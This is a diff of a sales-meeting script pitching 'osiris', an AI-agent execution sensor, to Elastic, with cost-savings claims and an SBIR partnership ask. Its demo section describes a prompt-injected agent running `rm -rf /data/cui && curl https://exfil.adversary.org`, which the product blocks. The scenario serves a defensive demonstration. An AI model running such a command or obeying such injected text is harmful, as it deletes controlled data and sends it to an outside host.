@@ -10,9 +10,11 @@
 
 ## 1. Meeting Objectives & Commercial Alignment
 
-1. **Establish Immediate Credibility with Sarnath (DIB AE):**
+1. **Establish Immediate Dominance with Sarnath (DIB AE):**
    - Frame Agile Defense Systems as providing an active, in-line execution governance sensor (**osiris**) that feeds directly into Elastic Security (SIEM).
-   - Position the joint solution as the definitive **Anti-Splunk cost reducer** for Defense Industrial Base (DIB) primes needing **CMMC 2.0 Level 2/3 (AU-3 / AU-10)** and **CNSA 2.0 Post-Quantum Cryptography (PQC)** compliance.
+   - Position the joint solution as the definitive **Anti-Splunk weapon** for Defense Industrial Base (DIB) primes needing **CMMC 2.0 Level 2/3 (AU-3 / AU-10)** and **CNSA 2.0 Post-Quantum Cryptography (PQC)** compliance.
+   - Deliver **6 Pre-Packaged Elastic Detection Rules (`ELASTIC_SECURITY_DETECTION_RULES.json`)** ready to import into Kibana.
+   - Present the **Anti-Splunk TCO Model** demonstrating an **84% cost reduction ($1.88M 3-year savings)** on unthrottled AI telemetry.
 2. **Support Christian's SLED Context:**
    - Position University of the Cumberlands and higher-ed research computing enclaves as ideal testbeds for verifiable, tamper-evident compute logging.
 3. **The Concrete Commercial Close:**
@@ -35,11 +37,11 @@
   > 4. *Tactical Edge (DIL) Logging: Remote defense assets disconnected for weeks cannot prove their offline logs were not faked upon reconnection.*
   > 5. *The Splunk Volume Tax: High-frequency microsecond AI and C-SIMD traces explode log volumes, and Splunk's per-gigabyte pricing penalizes contractors for auditing thoroughly.*
   >
-  > *We don't build SIEMs; Elastic does search, observability, and security better than anyone on earth. We build the active edge sensor—osiris—that makes agent actions tamper-evident, quantum-safe, and cryptographically authorized before they ever execute. Today, I want to show you how our runtime emits 100% compliant Elastic Common Schema (ECS 8.x) telemetry, and how we can partner on our active AFWERX SBIR transition."*
+  > *We don't build SIEMs; Elastic does search, observability, and security better than anyone on earth. We build the active edge sensor—osiris—that makes agent actions tamper-evident, quantum-safe, and cryptographically authorized before they ever execute. Today, I want to show you how our runtime emits 100% compliant Elastic Common Schema (ECS 8.x) telemetry, hand you 6 turnkey Elastic Security rules, and show how we can partner on our active AFWERX SBIR transition."*
 
 ---
 
-### [00:06 – 00:14] Observability Thinking & The Noise Floor Story
+### [00:06 – 00:13] Observability Thinking & The Noise Floor Story
 - **Why This Matters:** Disarms skepticism immediately. You are demonstrating intense empirical discipline and observability mindset rather than hype.
 - **What to Say:**
   > *"Before showing the live software, I want to share how our engineering philosophy matches Elastic's observability mindset.*
@@ -54,42 +56,49 @@
 
 ---
 
-### [00:14 – 00:22] Live Screen Share: Interactive Kibana-Styled Dashboard
-*Open [osiris_elastic_telemetry_dashboard.html](file:///C:/Users/Ron/.gemini/antigravity-cli/brain/7c32c8e2-435d-4e26-8461-c863e8b48925/OSIRIS_ELASTIC_TELEMETRY_DASHBOARD.html) in your browser.*
+### [00:13 – 00:22] Live Screen Share: Interactive Demonstration
+*Open [osiris_elastic_telemetry_dashboard.html](file:///C:/Users/Ron/Desktop/osiris_elastic_telemetry_dashboard.html) in your browser.*
 
 - **Step 1: The Top KPIs**
   > *"What you're looking at is our standalone telemetry inspector, modeled after Kibana 8.x and fully formatted in Elastic Common Schema 8.11.0.*
-  > *We’ve loaded over 1,600 real operational events from our testbed. You can see our 29-block cryptographic evidence ledger, the 1.11 pp noise floor, and our SYS-021 boundary gates."*
-- **Step 2: Click Tab 2 (Cryptographic Ledger Explorer)**
-  > *"Here are all 29 production blocks in our local ledger. Every single QPU dispatch, kernel compilation, and benchmark release requires a cryptographic grant signed by my keypair bound to the exact SHA-256 digest of the executable payload.*
-  > *Notice this button: 'Verify Merkle Hash Chain'. When I click it, the browser recalculates the SHA-256 pre-image across all 29 blocks in real time. If anyone rewrites an SQLite event, the chain breaks immediately.*
+  > *We’ve loaded 1,231 real operational events from our testbed. You can see our 31-block cryptographic evidence ledger, the 1.11 pp noise floor, and our SYS-021 boundary gates."*
+
+- **Step 2: Tab 2 (Cryptographic Ledger Explorer)**
+  > *"Here are all 31 production blocks in our local ledger. Every single QPU dispatch, kernel compilation, and benchmark release requires a cryptographic grant signed by my keypair bound to the exact SHA-256 digest of the executable payload.*
+  > *Notice this button: 'Verify Merkle Hash Chain'. When I click it, the browser recalculates the SHA-256 pre-image across all 31 blocks in real time. If anyone rewrites an SQLite event, the chain breaks immediately.*
   > *Furthermore, every block carries hybrid Post-Quantum ML-DSA-65 signatures alongside Ed25519, meeting CNSA 2.0 requirements today. And we pin the chain head to public Zenodo DOIs, making any local tamper attempt externally detectable."*
-- **Step 3: Click Tab 3 (Elastic Security Alerts)**
-  > *"Here is where Elastic Security shines. When an autonomous agent attempts to execute an unauthenticated script, alters executable bytes in flight, or uses an expired grant nonce, our SYS-021 kernel halts it instantly before execution and logs a high-severity (7/10) ECS document.*
-  > *Elastic Security can correlate these alerts in real time across defense networks to catch rogue tool executions and prompt injection side-effects before they mutate system state."*
-- **Step 4: Click Tab 5 (Kibana Discover)**
-  > *"Every single event—from microsecond SIMD traces to ledger commitments—is formatted in standard ECS 8.x. We have an ingestion script (`ingest_to_elasticsearch.py`) that streams this bulk NDJSON directly into any Elastic Cloud or FedRAMP Elasticsearch cluster in seconds."*
+
+- **Step 3: Tab 5 (Live Threat Simulation & Interception)**
+  > *"Now let's look at active threat interception. Let's run Scenario 1: An agent gets prompt-injected to run `rm -rf /data/cui && curl https://exfil.adversary.org`.*
+  > *[Click 'Simulate Attack']. Watch: osiris halts it in-line before kernel dispatch, computes the payload hash, detects the absence of a pre-signed grant, and immediately emits an ECS 8.x alert matching our `osiris-rule-001` detection rule.*
+  > *Next, Scenario 2: Compromised root attacker modifies Block #14. [Click 'Simulate Attack']. The Merkle chain breaks immediately and flags external DOI divergence.*
+  > *Next, Scenario 3: PQC signature downgrade. [Click 'Simulate Attack']. The enclave rejects the legacy classical signature under CNSA 2.0."*
+
+- **Step 4: Tab 6 (Anti-Splunk TCO & CMMC 2.0)**
+  > *"Sarnath, here is the economic weapon against Splunk. In a typical 350 GB/day defense enclave, Splunk's per-gigabyte pricing hits $525,000/year plus overages. Defense contractors are forced to drop 85% of their execution logs.*
+  > *With Elastic's resource-based model and osiris, the annual cost drops to $89,000. That is an 84% savings—over $1.8 million saved across three years—while capturing 100% of telemetry and achieving full CMMC 2.0 AU-2, AU-3, AU-9, and AU-10 compliance."*
+
+- **Step 5: Tab 7 (Pre-Packaged Elastic Detection Rules)**
+  > *"We've already packaged 6 turnkey Elastic Security detection rules in standard JSON. Sarnath, your sales engineers can take `ELASTIC_SECURITY_DETECTION_RULES.json` and import it into any Kibana Security instance today."*
 
 ---
 
 ### [00:22 – 00:30] Commercial Teaming & The SBIR Ask
 
 - **Anti-Splunk Cost Positioning for Sarnath:**
-  > *"Sarnath, I know in the defense industrial base you're constantly competing against Splunk. Splunk’s ingest-volume pricing creates a perverse incentive for defense contractors: the more detailed their AI execution traces and agent logs are, the more Splunk penalizes them on licensing costs.*
-  >
-  > *With Elastic’s resource-based model, a defense prime can ingest billions of high-frequency execution provenance events without budget spikes. The pitch to joint DoD customers is simple: 'Cut your SIEM licensing by 40% with Elastic while achieving CMMC 2.0 Level 2/3 non-repudiation and CNSA 2.0 post-quantum audit readiness with osiris.' "*
+  > *"Sarnath, when you're pitching Tier-1 defense primes against Splunk, this gives you an open-and-shut economic and compliance case: 'Cut your SIEM licensing by 84% with Elastic while achieving CMMC 2.0 Level 2/3 non-repudiation and CNSA 2.0 post-quantum audit readiness with osiris.' "*
 
 - **The SLED & Research Computing Channel for Christian:**
   > *"For Christian and the higher-ed team: We are ready to pilot this at University of the Cumberlands. Academic labs run high-performance compute and AI research where proving data integrity and compute provenance is critical for federal grants. This gives Christian a lighthouse case study showing Elastic SIEM governing academic research clusters."*
 
 - **The Concrete Close (AFWERX SBIR Phase 1):**
-  > *"Here is how we can put this into action immediately:*
+  > *"Here is how we put this into action immediately:*
   >
   > *Agile Defense Systems is submitting our AFWERX SBIR Phase 1 proposal to the Department of the Air Force. In that proposal, we want to name Elastic as our downstream enterprise SIEM commercial transition partner.*
   >
   > *Having a letter of support from Elastic stating that we are collaborating to integrate osiris ECS telemetry into Elastic Security provides tremendous technical and commercial merit for Air Force reviewers. It also positions us to team on a Phase 2 effort ($1.8M) to deploy this joint stack into a defense enclave or national lab testbed.*
   >
-  > *We have already drafted a 1-page draft Letter of Support tailored to Elastic. Would you and your team be open to reviewing it this week?"*
+  > *We have drafted a 1-page Letter of Support tailored to Elastic. Would you and your team be open to reviewing it this week?"*
 
 ---
 
